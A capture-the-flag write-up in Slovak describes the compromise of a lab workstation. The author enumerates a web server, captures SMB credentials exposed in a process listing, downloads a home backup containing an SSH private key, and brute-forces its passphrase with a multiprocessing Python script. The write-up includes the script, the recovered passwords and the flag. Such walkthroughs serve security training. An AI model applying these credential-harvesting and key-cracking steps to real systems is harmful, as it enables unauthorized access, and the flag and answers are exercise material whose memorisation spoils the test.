# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> please check if any inappropriate services are running on the workstation **`john.admins.cypherfix.tcc`**. We know that this workstation belongs to an administrator who likes to experiment on his own machine.
> 
> See you in the next incident!


----------

# Riešenie #

Ako vždy, prebehnem cez nmap a vidím, že server beží na IP `10.99.24.101` a má otvorené porty 22 (SSH) a 80 (WEB). Pozrieme web, na ňom sa zobrazí len hláška `Hello world in PHP.` a ssh zatiaľ nemá cenu pozerať, keďže nemáme nič použitelné pre prihlásenie. Stránku som prebehol cez 

	dirb http://john.admins.cypherfix.tcc -X .txt,.htm,.html,.php 

vrátilo dva živé endpointy

	---- Scanning URL: http://john.admins.cypherfix.tcc/ ----
	+ http://john.admins.cypherfix.tcc/environment.php (CODE:200|SIZE:3466)                                                                                                                 
	+ http://john.admins.cypherfix.tcc/index.php (CODE:200|SIZE:28) 

na enviroment vidíme nejaké zaujímavé výpisy

    Environment Variables
    Linux 3c829efad07d 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64 GNU/Linux
    Disk usage
    Filesystem Size Used Avail Use% Mounted on
    overlay 98G 36G 59G 38% /
    tmpfs 64M 0 64M 0% /dev
    shm 64M 0 64M 0% /dev/shm
    /dev/sda2 98G 36G 59G 38% /etc/hosts
    tmpfs 3.9G 0 3.9G 0% /proc/acpi
    tmpfs 3.9G 0 3.9G 0% /sys/firmware
    Running Processes
    USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
    root 1 0.0 0.0 3924 2712 ? Ss Oct14 0:00 /bin/bash /entrypoint.sh
    root 62 0.0 0.2 37096 18420 ? S Oct14 8:22 /usr/bin/python3 /usr/bin/supervisord
    root 63 0.0 0.0 2576 792 ? S Oct14 0:00 \_ /bin/sh /usr/sbin/apachectl -D FOREGROUND
    root 69 0.0 0.1 201060 11652 ? S Oct14 1:30 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911104 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911305 0.0 0.1 201788 15060 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911334 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911346 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911352 0.0 0.1 201808 15064 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911371 0.0 0.1 201788 15076 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911393 0.0 0.1 201788 15092 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911400 0.0 0.1 201788 15088 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911407 0.0 0.1 201788 15152 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911414 0.0 0.1 201656 14828 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    root 64 0.0 0.0 3976 2144 ? S Oct14 0:12 \_ cron -f
    root 1041503 0.0 0.0 5868 2616 ? S 12:14 0:00 | \_ CRON -f
    root 1041504 0.0 0.0 2576 896 ? Ss 12:14 0:00 | \_ /bin/sh -c /bin/ps faxu > /backup/ps.txt
    root 1041505 0.0 0.0 8100 3960 ? R 12:14 0:00 | \_ /bin/ps faxu
    root 65 0.0 0.0 15432 4720 ? S Oct14 1:07 \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
    john@tc+ 66 0.0 0.0 2464 824 ? S Oct14 0:00 \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
    john@tc+ 67 0.0 0.4 45112 37428 pts/0 Ss+ Oct14 19:45 \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100


Vidíme, že tam beží nejaký tunel na ip `10.99.24.100`, a vykonávajú sa tam nejaké pravidelné úlohy `cron -f`. Zatiaľ ale nič, čo by nás nejako posunulo. Avšak napísal som si skript, ktorý sa mi každú minútu pozrel  na daný endpoint a zachtával zmeny a všimol som si, že každých 10 minút beží nejaký backup a stránka vyzéra na minútu inak.

    Environment Variables
    Linux 3c829efad07d 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64 GNU/Linux
    Disk usage
    Filesystem Size Used Avail Use% Mounted on
    overlay 98G 36G 59G 38% /
    tmpfs 64M 0 64M 0% /dev
    shm 64M 0 64M 0% /dev/shm
    /dev/sda2 98G 36G 59G 38% /etc/hosts
    tmpfs 3.9G 0 3.9G 0% /proc/acpi
    tmpfs 3.9G 0 3.9G 0% /sys/firmware
    Running Processes
    USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
    root 1 0.0 0.0 3924 2712 ? Ss Oct14 0:00 /bin/bash /entrypoint.sh
    root 62 0.0 0.2 37096 18420 ? S Oct14 8:22 /usr/bin/python3 /usr/bin/supervisord
    root 63 0.0 0.0 2576 792 ? S Oct14 0:00 \_ /bin/sh /usr/sbin/apachectl -D FOREGROUND
    root 69 0.0 0.1 201060 11652 ? S Oct14 1:30 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911104 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911305 0.0 0.1 201788 15076 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911334 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911346 0.0 0.1 201788 15072 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911352 0.0 0.1 201808 15092 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911371 0.0 0.1 201788 15076 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911393 0.0 0.1 201788 15092 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911400 0.0 0.1 201788 15088 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911407 0.0 0.1 201788 15152 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    www-data 911414 0.0 0.1 201656 14828 ? S Oct28 0:04 | \_ /usr/sbin/apache2 -D FOREGROUND
    root 64 0.0 0.0 3976 2144 ? S Oct14 0:12 \_ cron -f
    root 1041788 0.0 0.0 5868 2612 ? S 12:20 0:00 | \_ CRON -f
    root 1041791 0.0 0.0 2576 904 ? Ss 12:20 0:00 | \_ /bin/sh -c read -t 2.0; /bin/bash /opt/client/backup.sh
    root 1041793 0.0 0.0 3924 2824 ? S 12:20 0:00 | \_ /bin/bash /opt/client/backup.sh
    root 1041804 0.0 0.0 38868 5240 ? R 12:20 0:00 | \_ smbclient -U backuper%Bprn5ibLF4KNS4GR5dt4 //10.99.24.100/backup -c put /backup/backup-1730377201.tgz backup-home.tgz
    root 1041805 0.0 0.0 8100 4000 ? R 12:20 0:00 | \_ ps faxu
    root 65 0.0 0.0 15432 4720 ? S Oct14 1:07 \_ sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
    john@tc+ 66 0.0 0.0 2464 824 ? S Oct14 0:00 \_ sshpass -p xxxxxxxxxxxxxxxxxxxx ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100
    john@tc+ 67 0.0 0.4 45112 37428 pts/0 Ss+ Oct14 19:45 \_ ssh -o StrictHostKeyChecking=no -N -D 0.0.0.0:23000 backuper@10.99.24.100

Tu už je to zaujímavé, nakoľko tu vidíme výpis s tým, že vytvorenú zálohu  ukladá na samba server a vo výpise sú aj prihlasovacie údaje na používateľa backuper... skúsime sa pozrieť na server a použijeme nájdene prihlasovacie údaje

    smbclient //10.99.24.100/backup -U backuper

	Password for [WORKGROUP\backuper]:
	Try "help" to get a list of possible commands.
	smb: \> dir
	  .                                   D        0  Thu Oct 31 08:27:43 2024
	  ..                                  D        0  Mon Oct 14 13:10:34 2024
	  backup-home.tgz                     A  5830741  Thu Oct 31 08:30:02 2024
	
	                102175644 blocks of size 1024. 60824104 blocks available
	smb: \> get backup-home.tgz 
	getting file \backup-home.tgz of size 5830741 as backup-home.tgz (10623.3 KiloBytes/sec) (average 10623.3 KiloBytes/sec)
	smb: \> 
	 

použil som objavené heslo, prihlásilo ma, nazrel som do priečinka, kde sa nachádzal súbor so zálohou, stiahol som a rozbalil. Archív však používa absolútne cesty, preto je lepšie použíť argument --strip-components=1, pripravil som si priečinok untar, kde si archív rozbalím a idem na to

    tar --strip-components=1 -xzf backup-home.tgz -C /home/kali/backuper/untar

archív teda obsahuje priečinok `john@tcc.local` aj s obsahom celého priečinka daného používateľa, vrátane pričinka .ssh so súbormi

    ┌──(kali㉿kali)-[~/backuper/untar/john@tcc.local]
    └─$ ls -la
    total 52
    drwx------ 6 kali kali 4096 Oct 14 13:10 .
    drwxrwxr-x 3 kali kali 4096 Oct 31 09:01 ..
    -rw-r--r-- 1 kali kali 5678 Oct 14 13:10 .bash_history
    -rw-r--r-- 1 kali kali  220 Oct 14 13:10 .bash_logout
    -rw-r--r-- 1 kali kali  571 Oct 14 13:10 .bashrc
    drwxr-xr-x 3 kali kali 4096 Oct 14 13:10 .config
    -rw-r--r-- 1 kali kali   47 Oct 14 13:10 .lesshst
    drwxr-xr-x 2 kali kali 4096 Oct 14 13:10 mc
    drwxr-xr-x 3 kali kali 4096 Oct 14 13:10 .mozilla
    -rw-r--r-- 1 kali kali  161 Oct 14 13:10 .profile
    -rw-r--r-- 1 kali kali   75 Oct 14 13:10 .selected_editor
    drwxr-xr-x 2 kali kali 4096 Oct 14 13:10 .ssh

    ┌──(kali㉿kali)-[~/backuper/untar/john@tcc.local]
    └─$ ls -la .ssh
    total 24
    drwxr-xr-x 2 kali kali 4096 Oct 14 13:10 .
    drwx------ 6 kali kali 4096 Oct 14 13:10 ..
    -rw-r--r-- 1 kali kali  445 Oct 14 13:10 authorized_keys
    -rw-r--r-- 1 kali kali 1766 Oct 14 13:10 id_rsa
    -rw-r--r-- 1 kali kali  380 Oct 14 13:10 id_rsa.pub
    -rw-r--r-- 1 kali kali  142 Oct 14 13:10 known_hosts
    
pozrieme sa do súboru authorized_keys

    $ cat authorized_keys   
    from="10.99.24.100",command="cat /home/john@tcc.local/flag.txt" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCefEn6D9Gk6lWRXChdqEdIojkCr7zbRXv9UfkrXS+zoDdGt5r6jrTzO5orftmTIcTDiB6sntJbAF91vSsQiG8QBMld3Y9VR8ZAkobspuzSZL/rJzjcq4+0ooVEL/OuuMFtW9aPCBmB43Aa50yrhirUyxgT7Oh23iwVMh1s5WyC3WR7QuyMbs0TvZOIQWK4FltcDqT9w+3+oekxOOwyA8QdjodEi2Pmjnw/bTWpTIrH+1QDaN1tp1MbYUaxksAUY5WT5oBIszEEdESPcpIg6/N8MvaSMPoTP1Jmc1TZBR/ZVeSOjBgz5VsNqP+bbd8CUzfoIEIz3mt8Wpw8q+WyIkh1
    
vidíme, že tu jeden platný, pozrieme sa, či je to ten, ktorý máme

    $ cat id_rsa.pub
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCefEn6D9Gk6lWRXChdqEdIojkCr7zbRXv9UfkrXS+zoDdGt5r6jrTzO5orftmTIcTDiB6sntJbAF91vSsQiG8QBMld3Y9VR8ZAkobspuzSZL/rJzjcq4+0ooVEL/OuuMFtW9aPCBmB43Aa50yrhirUyxgT7Oh23iwVMh1s5WyC3WR7QuyMbs0TvZOIQWK4FltcDqT9w+3+oekxOOwyA8QdjodEi2Pmjnw/bTWpTIrH+1QDaN1tp1MbYUaxksAUY5WT5oBIszEEdESPcpIg6/N8MvaSMPoTP1Jmc1TZBR/ZVeSOjBgz5VsNqP+bbd8CUzfoIEIz3mt8Wpw8q+WyIkh1  

Tu je jasne vidieť, že daný kľúč nám budú užitočné, pretože hodnoty sú rovnaké a zároveň vidíme, že ho akceptuje len pokiaľ pripojenie prichádza z ip adresy `10.99.24.100`. 

Z predošlých krokov, konkrétne z výpisu enviroment stránky vidíme, že sa server pripája na `backuper@10.99.24.100`, tak sa skúsime prihlásiť s údajmi, ktoré sme skúsili na smbclient-ovi.

    ssh 10.99.24.100 -l backuper  
    backuper@10.99.24.100's password: 
    Connection to 10.99.24.100 closed.

Očividne ma prihlásilo, ale server hneď ukončil spojenie, takže nedokážem zadávať príkazy. To mi zrejme asi nebude prekážať, lebo ako je vidieť z enviroment výpisu, John to používa len na vytvorenie tunela. Skúsime teda vytvoriť tunel a rovno sa prihlásiť na server johna.

    $ ssh -J backuper@10.99.24.100 -i id_rsa -l 'john@tcc.local' 10.99.24.101
    backuper@10.99.24.100's password: 
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    @ WARNING: UNPROTECTED PRIVATE KEY FILE!  @
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    Permissions 0644 for 'id_rsa' are too open.
    It is required that your private key files are NOT accessible by others.
    This private key will be ignored.
    Load key "id_rsa": bad permissions
    john@tcc.local@10.99.24.101: Permission denied (publickey).
    
vyzerá, že musím ubrať práva 

    ┌──(kali㉿kali)-[~/backuper/untar/john@tcc.local/.ssh]
    └─$ chmod 600 id_rsa   
       
    ┌──(kali㉿kali)-[~/backuper/untar/john@tcc.local/.ssh]
    └─$ ssh -J backuper@10.99.24.100 -i id_rsa -l 'john@tcc.local' 10.99.24.101
    backuper@10.99.24.100's password: 
    Enter passphrase for key 'id_rsa': 
    Enter passphrase for key 'id_rsa': 
    Enter passphrase for key 'id_rsa': 
    john@tcc.local@10.99.24.101: Permission denied (publickey).
    
Tunel nám vytvorilo správne, dokonca aj akceptovalo privátny kľúč, ale kľúč nám neakceptoval heslo Enterprise1512, známe zo súboru .bash_hotory.. Bruteforce sa mi nechce, skúsim slovník. Slovník nič nenašiel, tak skúsim nejaký pattern bruteforce z hesla ktoré poznám, možno bude iba iné číslo v hesle.

```
import multiprocessing
import paramiko
import sys
from multiprocessing import Value

key_file_path = "C:\\Users\\Majino\\Documents\\catch2024\\id_rsa"
password_found = Value('b', 0)

def try_password(password):
    if password_found.value == 1:
        return
    try:
        paramiko.RSAKey(filename=key_file_path, password=password)
        with password_found.get_lock():
            password_found.value = 1
        print(f"\nPassword found: {password}")
    except:
        pass

def password_range(start, end):
    for i in range(start, end):
        yield f"Enterprise{i}"

def worker(start, end):
    for password in password_range(start, end):
        if password_found.value == 1:
            break
        try_password(password)

if __name__ == "__main__":
    num_cores = 16
    range_per_core = 100000 // num_cores
    processes = []

    for i in range(num_cores):
        start = i * range_per_core
        end = start + range_per_core
        p = multiprocessing.Process(target=worker, args=(start, end))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    if password_found.value == 0:
        print("\nPassword brute force completed. No password found.")

```

Skúsil som utilizovať všetkých 16 vlákien a skript som pustil v natívnom systéme, u mňa windows, pre lepší výkon.

    C:\Users\Majino\Documents\catch2024>python sshbf1.py
	Password found: Enterprise2215
	Password brute force completed. No password found. 

Tak máme nové passphrase pre private key, skúsime ho použiť

	ssh -J backuper@10.99.24.100 -i id_rsa -l 'john@tcc.local' 10.99.24.101
	backuper@10.99.24.100's password:  (zadáme Bprn5ibLF4KNS4GR5dt4)
	Enter passphrase for key 'id_rsa': (zadáme Enterprise2215)
	FLAG{sIej-5d9a-aIbh-v4qH}
	Connection to 10.99.24.101 closed.


A máme vlajku.

----------

## Vlajka ##
    FLAG{sIej-5d9a-aIbh-v4qH}